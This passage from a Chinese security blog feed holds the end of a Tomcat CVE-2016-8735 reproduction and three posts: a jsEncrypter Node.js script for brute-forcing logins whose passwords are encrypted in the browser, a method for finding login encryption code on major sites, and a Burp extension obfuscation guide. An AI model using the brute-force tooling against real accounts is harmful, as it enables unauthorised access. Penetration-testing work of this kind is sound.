java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1771)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1990)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1915)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1990)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadObject(ObjectInputStream.java:500)</span><br><span class="line">        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:427)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:606)</span><br><span class="line">        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)</span><br><span class="line">        at java.util.HashMap.readObject(HashMap.java:1180)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:606)</span><br><span class="line">        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1990)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadObject(ObjectInputStream.java:500)</span><br><span class="line">        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:427)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:606)</span><br><span class="line">        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1990)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1915)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)</span><br><span class="line">        ... 17 more</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://help.aliyun.com/knowledge_detail/48106.html" target="_blank" rel="noopener">【漏洞公告】CVE-2016-8735：Apache Tomcat远程代码执行漏洞</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&mid=2650173865&idx=1&sn=431e634a1350b070b54f9b5becd9a143&key=9ed31d4918c154c8af360e3955a9c76c2d28b7b700fce01b12fe1d3fe878a810323d81b26788da6aa2b6338bc6796969265d165d6a7384351359a6a75a1e5e68a3aeaa96554e3fedbc2e722d1637fcd8" target="_blank" rel="noopener">Apache Tomcat Remote Code Execution(CVE-2016-8735)</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-92553" target="_blank" rel="noopener">Apache Tomcat Remote Code Execution</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsEncrypter的Node.js版server脚本</title>
      <link href="/articles/2018/jsEncrypter-nodejs-server-script/"/>
      <url>/articles/2018/jsEncrypter-nodejs-server-script/</url>
      
        <content type="html"><![CDATA[<p>最近在公众号发现有小伙伴在使用nodejs调用加密脚本对密码进行加密暴力破解。于是打算给Burp插件jsEncrypter添加<code>nodejs</code>版本的server脚本。目前已经更新该脚本到项目中，感兴趣的小伙伴可以去试试效果。</p><h2 id="Node-js版server脚本代码"><a href="#Node-js版server脚本代码" class="headerlink" title="Node.js版server脚本代码"></a>Node.js版server脚本代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: c0ny1</span></span><br><span class="line"><span class="comment"> * date: 2018-4-14</span></span><br><span class="line"><span class="comment"> * file: nodejs_server.js</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> host = <span class="string">'127.0.0.1'</span>; <span class="comment">//地址</span></span><br><span class="line"><span class="keyword">var</span> port = <span class="string">'1664'</span>; <span class="comment">//端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//require('your_encrypte_script.js'); /*引入实现加密的js文件*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./sha384.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">js_encrypt</span>(<span class="params">payload</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newpayload;</span><br><span class="line"><span class="comment">/**********在这里编写调用加密函数进行加密的代码************/</span></span><br><span class="line"><span class="keyword">var</span> pwdhash=CryptoJS.SHA384(payload);</span><br><span class="line">newpayload = pwdhash.toString();</span><br><span class="line"><span class="comment">/**********************************************************/</span></span><br><span class="line"><span class="keyword">return</span> newpayload;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request,response</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(request.method === <span class="string">'POST'</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> postData = <span class="string">''</span>;</span><br><span class="line">request.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">params</span>)</span>&#123;</span><br><span class="line">postData += params;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">request.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> dataString = postData.toString();</span><br><span class="line"><span class="keyword">var</span> dataObj = querystring.parse(dataString);</span><br><span class="line"><span class="keyword">var</span> payload = dataObj.payload;</span><br><span class="line"><span class="keyword">var</span> encrypt_payload = js_encrypt(payload); </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'[+] '</span> + payload + <span class="string">':'</span> + encrypt_payload);</span><br><span class="line"></span><br><span class="line">response.statusCode = <span class="number">200</span>;</span><br><span class="line">response.write(encrypt_payload);</span><br><span class="line">response.end();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">response.statusCode = <span class="number">200</span>;</span><br><span class="line">response.write(<span class="string">"^_^\n\rhello jsEncrypter!"</span>);</span><br><span class="line">response.end();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(port, host, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[!] ^_^"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] nodejs server start!"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] address: http://"</span>+host+<span class="string">":"</span>+port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="nodejs版server脚本使用"><a href="#nodejs版server脚本使用" class="headerlink" title="nodejs版server脚本使用"></a>nodejs版server脚本使用</h2><p>nodejs版本的server脚本和phantomjs版本基本一样，不过nodejs版本的使用需要多一个步骤。下面我们搭建起jsEncrypter项目自带的实验环境，并通过演示md5加密传输来说明脚本如何使用。</p><h4 id="1-修改调用需要调用的加密脚本"><a href="#1-修改调用需要调用的加密脚本" class="headerlink" title="1.修改调用需要调用的加密脚本"></a>1.修改调用需要调用的加密脚本</h4><p>在加密脚本的末尾加入两行代码。代码格式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global.function = <span class="function"><span class="keyword">function</span> //将需要调用的函数或对象编程全局</span></span><br><span class="line"><span class="function"><span class="title">exports</span>.<span class="title">function</span> = <span class="title">function</span> //使用<span class="title">export</span>来暴露接口，不然<span class="title">nodejs</span>无法找到我们的加密方法</span></span><br></pre></td></tr></table></figure><p>我们查看例子中的页面源码，可知前端引入<code>md5.js</code>实现对数据的加密,所以我们把md5.js保存到本地。然后再看看前端调用加密函数的代码是什么？</p><p><img src="/articles/2018/jsEncrypter-nodejs-server-script/md5_invoke.png" alt="图1-寻找加密脚本文件"></p><p>所以我们在<code>md5.js</code>结尾加入这两行代码。</p><p><img src="/articles/2018/jsEncrypter-nodejs-server-script/md5_add_code.png" alt="图2-添加代码到加密脚本文件末尾"></p><h4 id="2-编写调用脚本"><a href="#2-编写调用脚本" class="headerlink" title="2.编写调用脚本"></a>2.编写调用脚本</h4><p>在nodejs_server.js中引入加密脚本，并在js_encrypt方法中编写调用加密函数进行加密。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./md5.js'</span>); <span class="comment">/*引入实现加密的js文件*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">js_encrypt</span>(<span class="params">payload</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newpayload;</span><br><span class="line"><span class="comment">/**********在这里编写调用加密函数进行加密的代码************/</span></span><br><span class="line">newpayload = hex_md5(payload);</span><br><span class="line"><span class="comment">/**********************************************************/</span></span><br><span class="line"><span class="keyword">return</span> newpayload;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="3-执行脚本"><a href="#3-执行脚本" class="headerlink" title="3.执行脚本"></a>3.执行脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node nodejs_server.js</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/jsEncrypter-nodejs-server-script/encrypt_result.png" alt="图3-加密效果"></p><p><strong>最后补充一点，测试环境中<code>sha384</code>加密例子有点特殊。</strong>sha384前端调用加密函数的代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">en_password = CryptoJS.SHA384(password);</span><br></pre></td></tr></table></figure><p>所以在<code>sha384.js</code>结尾应加入这两行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global.CryptoJS = CryptoJS;</span><br><span class="line">exports.CryptoJS = CryptoJS;</span><br></pre></td></tr></table></figure><p>而不是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global.CryptoJS = SHA384;</span><br><span class="line">exports.CryptoJS = SHA384;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>nodejs版本的server在使用过程需要修改原加密脚本，比phantomjs版本号稍微繁琐一点。大家看自己的习惯吧，萝卜青菜各有所爱！</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burp Suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速定位前端加密方法</title>
      <link href="/articles/2018/fast-locate-the-front-end-encryption-method/"/>
      <url>/articles/2018/fast-locate-the-front-end-encryption-method/</url>
      
        <content type="html"><![CDATA[<p>相信用过我<a href="https://github.com/c0ny1/jsEncrypter" target="_blank" rel="noopener">jsEncrypter</a>这个插件的朋友，都会碰到一个问题。 <strong>那就是一些大型网站前端太复杂，以至于无法定位到前端数据加密函数所在的位置</strong>。无法定位到加密方法所在，自然就无法编写jsEncrypter的phantomJS脚本了。k哥在今晚给了我很多灵感，让我对这个问题有一个完美的解决方案。以至于现在已是12号的凌晨3点，我仍不舍得搁浅内心零散的想法。窗外稍许的车辆略过的轰鸣，在夜深人静时显得格外刺耳。不过还好，没破坏我静静码字感觉。下面让我慢慢将这简单弱智有点零散，但细细思考，却有点意思的想法，串成一个流程。</p><h2 id="0x01-onClick定位法"><a href="#0x01-onClick定位法" class="headerlink" title="0x01 onClick定位法"></a>0x01 onClick定位法</h2><p>有时候在触发提交表单的标签中会存在一个onClik属性，该属性的值正好是一个js函数。而这个函数往往就是我们要找的数据加密函数。我们只需要找到它定义的地方即可。</p><p><img src="/articles/2018/fast-locate-the-front-end-encryption-method/LocationByonClick.png" alt="图1-通过onClick属性定位"></p><p>找到了加密数据的方法名之后，我们就可以去找一下该方法在那个js文件中定义，即可定位到位置。</p><p><img src="/articles/2018/fast-locate-the-front-end-encryption-method/FindFunctionFromOnClick.png" alt="图2-通过onClick定位到的方法"></p><h2 id="0x02-Event-Listeners定位法"><a href="#0x02-Event-Listeners定位法" class="headerlink" title="0x02 Event Listeners定位法"></a>0x02 Event Listeners定位法</h2><p>这个方法非常好，也是我觉得最好的方法。F12打开开发者工具，然后使用选择箭头选择目标标签，最后打开开发者工具Event Listeners面板。就能显示该标签对应的额事件了。我们关注的当然是click事件了。</p><p><img src="/articles/2018/fast-locate-the-front-end-encryption-method/LocationByEventListeners.png" alt="图3-通过Event Listeners定位"></p><p>由此我们就知道，我们的数据加密方法在<code>uni_loginv4_tangram_dde753f.js</code>文件的32行。点击该链接就能直接调转到代码处。</p><p><img src="/articles/2018/fast-locate-the-front-end-encryption-method/FindFunctionFromEventListeners.png" alt="图4-通过Event Listeners定位的代码"></p><p>这个方法虽然非常好，但是有一个天坑需要注意！有时候标签是有绑定方法的，但看到Event Listeners面板却是空的。我猜是因为浏览器它没有加载完全所有的数据，导致无法分析出各个元素绑定的方法。这时我们可以进行将登录整个流程走一遍，多次刷新页面，甚至可以ctrl+s将网页保存到本地等操作，总之只为一个目的： <strong>间接告诉浏览器赶紧将一些网页资源保存下来，以供Event Listeners分析出click事件对应的方法</strong>。目前发现这样勉强能解决。</p><p>这里插一句题外话：有一个和Event Listeners有关的辅助插件Visual Event，大家可以去体验一下。不过个人觉得不是特别好！</p><h2 id="0x03-搜索定位法"><a href="#0x03-搜索定位法" class="headerlink" title="0x03 搜索定位法"></a>0x03 搜索定位法</h2><p>如果遇到的情况很糟糕，页面没有指定onClick方法，Event Listeners怎么操作都是空白一片，Visual Event也是半死不活的时候。这是我们就只能自己动手，丰衣足食了。当然我承认这种情况基本不可能发生。然而谁还没有个万一呢？</p><p>先将页面ctrl+s,保存起来。然后使用notepad++搜索保存目录下所有内容。这时我们就要考虑寻找搜索关键字了。搜索操作过程虽然有点繁琐，但很简单。这里我挑比较有意思的选择搜索关键字的思考跟大家分享一下。</p><ol><li><p>从源头搜，什么是我们的源头搜呢？我们触发前端数据加密，然后进行传输的整个过程皆因为点击了一个标签造成。所以我们就可以通过这个标签的<code>id名</code>，<code>class名</code>或者<code>标签名</code>作为关键字去搜索，就能定位到开始进行加密处理的位置。最后根据起始位置，一步一步跟进就能找到我们的加密方法。</p></li><li><p>从终点搜，什么是我们的终点呢？当然是我们的最终发送数据包这一步了。我们可以用burp进行抓包，然后分析数据包的特点，提取关键字来定位。比如我们可以拿数据包提交的路径，可以拿数据包的参数等等作为关键字。定位到加密流程的最后一步，最后一步一步回溯找到加密方法。</p></li></ol><p>例如：我打算从源头开始搜，查看到源码中淘宝的登录按钮标签id值为<code>J_SubmitStatic</code>,于是我以<code>#J_SubmitStatic</code>作为关键字开始定位。</p><p><img src="/articles/2018/fast-locate-the-front-end-encryption-method/LocationByKeyword.png" alt="图5-通过关键定位"></p><h2 id="0x04-调试确认"><a href="#0x04-调试确认" class="headerlink" title="0x04 调试确认"></a>0x04 调试确认</h2><p>在使用了以上三个方法加辅助插件，基本可以保证能定位到99%网站前端密码的处理函数了。但我们仍然需要通过调式来确定我们定位到的地方就是数据加密方法。首选我们在定位的方法中打一个断点，然后在表单输入账号密码，最后点击提交。就可以进入调试模式了。进入调式模式，我们可以单步执行，梳理加密处理的每一步。方便我们更好的编写jsEncrypter插件的phantomJs脚本。</p><p><img src="/articles/2018/fast-locate-the-front-end-encryption-method/debug.png" alt="图6-调试确认"></p><h2 id="0x05-最后的话"><a href="#0x05-最后的话" class="headerlink" title="0x05 最后的话"></a>0x05 最后的话</h2><p>我使用了以上流程，先后定位到了百度，淘宝，腾讯和京东的前端页面数据加密方法。证明了我们的流程大体还是很实用的。各位同学可以按照上面的方法去测试一下，看看自己能否快速定位到数据加密方法？当然你有更加快速的方法，欢迎留言，让我们的这个快速定位前端加密方法的流程更加完美！已是凌晨4点，明天还有工作。祝每个还在深夜码字写代码的灵魂晚安！</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>混淆Burp插件代码</title>
      <link href="/articles/2018/obfuscation-of-burp-extension-code/"/>
      <url>/articles/2018/obfuscation-of-burp-extension-code/</url>
      
        <content type="html"><![CDATA[<p>说要混淆Burp插件，可能有些小伙伴会说：</p><p><strong>A:</strong>混淆干嘛，大家都这么忙，谁有时间看你的烂代码！</p><p><strong>B:</strong>现在都鼓励开源，你这么做有悖于开源精神。</p><p>……</p><p><strong>me:</strong>这和开源精神没有冲突，我的理解里，真正的开源精神应该是从内心出发的，而不是受“开源人士”的舆论压力，这是道德绑架。更不能因为大家开源，所以我也开源，为了开源而开源没有意义。况且本文仅仅研究混淆这门技术的原理和魅力！</p><p><strong>C:</strong>把不开源说得这么清新脱俗，NB！</p><p><strong>me:</strong>被你发现了，哈哈</p><h2 id="0x01-Burp插件混淆规则"><a href="#0x01-Burp插件混淆规则" class="headerlink" title="0x01 Burp插件混淆规则"></a>0x01 Burp插件混淆规则</h2><p>混淆不能一键化，java程序中有apk,有桌面引用程序，有web程序，有jar库。需要根据各自代码的特点来制定混淆规则。burp的插件，第一它不算应用，因为它没有main函数，第二它被burp调用，但又不算是库。倒是很像是介于两者之间，所以相对来说比较特殊。自然混淆时有些特殊……</p><ul><li>首选不能混淆掉burp这个包名，因为burp默认会读burp包下的BurpExtender。如果BurpExtender在其他包下，它会报错说找不到该入口类。</li><li>不能混淆掉burp包下的BurpExtender这个类，因为这是burp调用插件的入口。</li><li>不能混淆Burp包下引入的接口，因为接口是共同遵守的规范。</li></ul><h5 id="代码混淆工具"><a href="#代码混淆工具" class="headerlink" title="代码混淆工具"></a>代码混淆工具</h5><ul><li>ProGuard</li><li>allatori</li></ul><h2 id="0x02-使用ProGuard混淆"><a href="#0x02-使用ProGuard混淆" class="headerlink" title="0x02 使用ProGuard混淆"></a>0x02 使用ProGuard混淆</h2><p>混淆的本质就使程序的可读性变差，而通常程序的包名类名方法名和属性名都是遵守见名知意。所以我们反其道而行，先来生成令人眼傻傻分不清的混淆字典吧（坏笑脸）。ProGurd会根据我们的混淆字典，替换掉程序中令人易懂的名称！</p><table><thead><tr><th align="center">混淆对象</th><th align="center">元素</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">包名</td><td align="center">o,0</td><td align="center">00000o0oo0</td></tr><tr><td align="center">类名</td><td align="center">l,i</td><td align="center">ililiillii</td></tr><tr><td align="center">方法名和属性名</td><td align="center">l,1</td><td align="center">1l11111lll</td></tr></tbody></table><p>编写了一个py脚本来快速生成字典（obf_dic_creater.py）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment">#author:c0ny1</span></span><br><span class="line"></span><br><span class="line">package_str = <span class="string">"o0"</span></span><br><span class="line">class_str = <span class="string">"li"</span></span><br><span class="line">field_method_str = <span class="string">"l1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_obf_str</span><span class="params">(str,length)</span>:</span></span><br><span class="line">obf_str = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">j = random.randrange(<span class="number">0</span>,len(str)) </span><br><span class="line">obf_str+=str[j]</span><br><span class="line"><span class="keyword">print</span> obf_str</span><br><span class="line"><span class="keyword">return</span> obf_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_obf_dic</span><span class="params">(str,filename,length,num)</span>:</span></span><br><span class="line">f = open(filename,<span class="string">"a"</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(num):</span><br><span class="line">obf_str = create_obf_str(str,length)</span><br><span class="line">f.write(obf_str)</span><br><span class="line">f.write(<span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">create_obf_dic(package_str,<span class="string">"package_dic.txt"</span>,<span class="number">10</span>,<span class="number">500</span>)</span><br><span class="line">create_obf_dic(class_str,<span class="string">"class_dic.txt"</span>,<span class="number">10</span>,<span class="number">500</span>)</span><br><span class="line">create_obf_dic(field_method_str,<span class="string">"field_method_dic.txt"</span>,<span class="number">10</span>,<span class="number">500</span>)</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/obfuscation-of-burp-extension-code/obf_dic.png" alt="生成字典"></p><p>我们使用ProGuard的配置文件语法来描述burp插件混淆规则部分分析好的规则，内容如下</p><p>XXEHelper.pro</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-injars Test.jar #要混淆的插件</span><br><span class="line">-outjars Obf.jar #混淆成功后导出的文件</span><br><span class="line"></span><br><span class="line">#添加依赖的jar</span><br><span class="line">-libraryjars  &lt;java.home&gt;/lib/rt.jar </span><br><span class="line"></span><br><span class="line">-dontshrink #不压缩</span><br><span class="line">-dontoptimize #不优化</span><br><span class="line">-obfuscationdictionary package_dic.txt #方法和属性名混淆字典</span><br><span class="line">-classobfuscationdictionary class_dic.txt #类名混淆字典</span><br><span class="line">-packageobfuscationdictionary package_dic.txt #包名混淆字典</span><br><span class="line">-overloadaggressively #深度重载混淆</span><br><span class="line">-useuniqueclassmembernames #使用大小写混合类名</span><br><span class="line">-keeppackagenames burp # 不混淆burp这个包名</span><br><span class="line">-flattenpackagehierarchy me.gv7 #将混淆的包放在me.gv7这个父包</span><br><span class="line"></span><br><span class="line">-keep,allowshrinking class burp.* &#123; #不混淆burp.*下的class</span><br><span class="line">    public &lt;fields&gt;; #不混淆public属性</span><br><span class="line">    public &lt;methods&gt;; #不混淆public方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：在编写混淆配置文件时，需要用<code>-libraryjars</code>引入我们的插件依赖的jar。jar引入不全的话会导致ProGuard混淆失败。如果混淆失败，ProGuard会提示我们所缺少的类，我们可以根据该类名去以下网址搜索到对应jar,下载并引入后重新混淆即可。这个过程会很枯燥，要有耐心哦！该例子插件没有依赖外部jar，故只引入rt.jar即可。</p><ul><li><a href="http://mvnrepository.com" target="_blank" rel="noopener">http://mvnrepository.com</a></li><li><a href="http://www.findjar.com" target="_blank" rel="noopener">http://www.findjar.com</a></li></ul><p>大家可以以我这个配置文件为模板，根据具体情况来修改相关路径，和参数值，来混淆自己的burp插件！</p><p>最后我们运行<code>ProGuargui</code>&gt;<code>ProGuard</code>&gt;<code>Load configuration...</code>&gt;选择<code>XXEHelper.pro</code>&gt;<code>Process</code>&gt;<code>Process!</code></p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/ProGuard_obf_success.png" alt="ProGuargui混淆成功"></p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/ProGuard_before_obf.png" alt="ProGuard混淆前"></p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/ProGuard_after_obf.png" alt="ProGuard混淆后"></p><p>经过测试混淆后插件可以正常运行。</p><h2 id="0x03-使用allatori混淆"><a href="#0x03-使用allatori混淆" class="headerlink" title="0x03 使用allatori混淆"></a>0x03 使用allatori混淆</h2><p>不过ProGuard的混淆效果个人感觉不是特别好，公司大神推荐allatori这款商业混淆器。</p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/alltori_folders.png" alt="allaroi目录结构"></p><p>由于官方程序的目录结构比较深，为了方便研究复制核心文件，简洁目录格式为如下：</p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/after_obfuscated_folders.png" alt="allaroi目录结构"></p><p>根据以上我们burp混淆的规则，重新编写<code>config.xml</code>为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 